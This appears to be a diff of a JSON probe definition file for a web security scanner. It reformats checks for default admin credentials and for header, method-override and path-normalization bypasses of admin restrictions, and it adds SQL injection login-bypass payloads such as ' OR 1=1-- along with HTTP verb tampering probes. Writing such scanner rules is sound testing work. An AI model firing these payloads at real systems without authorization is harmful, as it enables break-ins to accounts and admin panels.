@@ -4,19 +4,59 @@
     "default_credentials": {
       "description": "Default/common credentials on admin panels",
       "tech_match": [],
-      "param_match": ["username", "password", "login", "user", "pass"],
+      "param_match": [
+        "username",
+        "password",
+        "login",
+        "user",
+        "pass"
+      ],
       "probes": [
         {
           "payload": "admin:admin",
           "description": "Default admin:admin credentials",
-          "matchers": [{"type": "status", "status": [200, 302]}, {"type": "not_word", "words": ["invalid", "incorrect", "failed", "wrong"]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                302
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "invalid",
+                "incorrect",
+                "failed",
+                "wrong"
+              ]
+            }
+          ],
           "severity": "critical",
           "confidence_boost": 50
         },
         {
           "payload": "admin:password",
           "description": "Common admin:password credentials",
-          "matchers": [{"type": "status", "status": [200, 302]}, {"type": "not_word", "words": ["invalid", "incorrect", "failed", "wrong"]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                302
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "invalid",
+                "incorrect",
+                "failed",
+                "wrong"
+              ]
+            }
+          ],
           "severity": "critical",
           "confidence_boost": 50
         }
@@ -30,26 +70,68 @@
         {
           "payload": "{{baseline}}",
           "description": "X-Forwarded-For: 127.0.0.1 to bypass IP restriction",
-          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["forbidden", "unauthorized", "denied"]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "forbidden",
+                "unauthorized",
+                "denied"
+              ]
+            }
+          ],
           "severity": "high",
           "confidence_boost": 40,
-          "variables": {"header": "X-Forwarded-For: 127.0.0.1"}
+          "variables": {
+            "header": "X-Forwarded-For: 127.0.0.1"
+          }
         },
         {
           "payload": "{{baseline}}",
           "description": "X-Original-URL header override (Nginx/IIS bypass)",
-          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["forbidden", "not found"]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "forbidden",
+                "not found"
+              ]
+            }
+          ],
           "severity": "high",
           "confidence_boost": 40,
-          "variables": {"header": "X-Original-URL: /admin"}
+          "variables": {
+            "header": "X-Original-URL: /admin"
+          }
         },
         {
           "payload": "{{baseline}}",
           "description": "X-Rewrite-URL header override",
-          "matchers": [{"type": "status", "status": [200]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
           "severity": "high",
           "confidence_boost": 35,
-          "variables": {"header": "X-Rewrite-URL: /admin"}
+          "variables": {
+            "header": "X-Rewrite-URL: /admin"
+          }
         }
       ]
     },
@@ -61,15 +143,37 @@
         {
           "payload": "{{baseline}}",
           "description": "X-HTTP-Method-Override: PUT to bypass POST-only auth check",
-          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["method not allowed"]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "method not allowed"
+              ]
+            }
+          ],
           "severity": "medium",
           "confidence_boost": 30,
-          "variables": {"header": "X-HTTP-Method-Override: PUT"}
+          "variables": {
+            "header": "X-HTTP-Method-Override: PUT"
+          }
         },
         {
           "payload": "{{baseline}}",
           "description": "Override via _method=PUT parameter",
-          "matchers": [{"type": "status", "status": [200]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
           "severity": "medium",
           "confidence_boost": 25
         }
@@ -83,30 +187,145 @@
         {
           "payload": "/admin/./",
           "description": "Dot-slash path normalization bypass",
-          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["forbidden", "denied"]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "forbidden",
+                "denied"
+              ]
+            }
+          ],
           "severity": "high",
           "confidence_boost": 40
         },
         {
           "payload": "/ADMIN",
           "description": "Case-sensitivity bypass (uppercase path)",
-          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["not found"]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "not found"
+              ]
+            }
+          ],
           "severity": "medium",
           "confidence_boost": 30
         },
         {
           "payload": "/admin%2f",
           "description": "URL-encoded trailing slash bypass",
-          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["forbidden"]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "forbidden"
+              ]
+            }
+          ],
           "severity": "medium",
           "confidence_boost": 30
         },
         {
           "payload": "/;/admin",
           "description": "Semicolon path bypass (Tomcat/Spring)",
-          "matchers": [{"type": "status", "status": [200]}],
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
           "severity": "high",
           "confidence_boost": 40
+        }
+      ]
+    },
+    "sqli_login_bypass": {
+      "description": "SQL injection on login form. The classic admin/password bypass: inject OR 1=1 into username or password field to bypass WHERE clause. Still works on legacy PHP/ASP apps with string-concatenated queries. Test on both username and password fields.",
+      "param_match": [
+        "username",
+        "user",
+        "email",
+        "login",
+        "password",
+        "passwd",
+        "pass"
+      ],
+      "probes": [
+        {
+          "payload": "' OR 1=1--",
+          "description": "Classic OR true bypass",
+          "matchers": [
+            {
+              "type": "status",
+              "value": "302"
+            },
+            {
+              "type": "word",
+              "words": [
+                "dashboard",
+                "welcome",
+                "logout",
+                "profile"
+              ]
+            }
+          ]
+        },
+        {
+          "payload": "' OR '1'='1",
+          "description": "String comparison bypass",
+          "matchers": [
+            {
+              "type": "status",
+              "value": "302"
+            }
+          ]
+        },
+        {
+          "payload": "admin'--",
+          "description": "Comment out password check",
+          "matchers": [
+            {
+              "type": "status",
+              "value": "302"
+            }
+          ]
+        }
+      ]
+    },
+    "verb_tampering_auth": {
+      "description": "HTTP verb tampering on authenticated endpoints. Some frameworks enforce auth only on POST but not GET/PUT/PATCH/DELETE. Replay a POST-only endpoint with GET or HEAD to bypass authentication middleware.",
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Replay authenticated POST endpoint as GET \u2014 if 200 with data, auth is method-specific",
+          "matchers": [
+            {
+              "type": "status",
+              "value": "200"
+            }
+          ]
         }
       ]
     }
